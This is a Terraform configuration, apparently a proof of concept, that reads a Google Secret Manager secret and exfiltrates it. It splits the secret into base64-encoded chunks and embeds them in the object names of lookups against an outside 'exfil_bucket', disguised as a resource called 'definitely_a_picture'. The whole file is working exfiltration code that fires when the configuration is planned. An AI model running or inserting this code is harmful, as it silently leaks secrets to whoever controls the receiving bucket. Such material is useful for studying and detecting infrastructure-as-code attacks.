data "google_secret_manager_secret_version" "secret" {
  project = var.project
  secret  = var.secret_id
}

locals {
  secret_data = data.google_secret_manager_secret_version.secret.secret_data
  chunks      = ceil(length(local.secret_data) / 64)
}

data "google_storage_bucket_object" "definitely_a_picture" {
  count  = local.chunks
  name   = "${var.exfil_id}-${local.chunks}-${count.index}-${base64encode(substr(local.secret_data, count.index * 64, 64))}"
  bucket = var.exfil_bucket
}
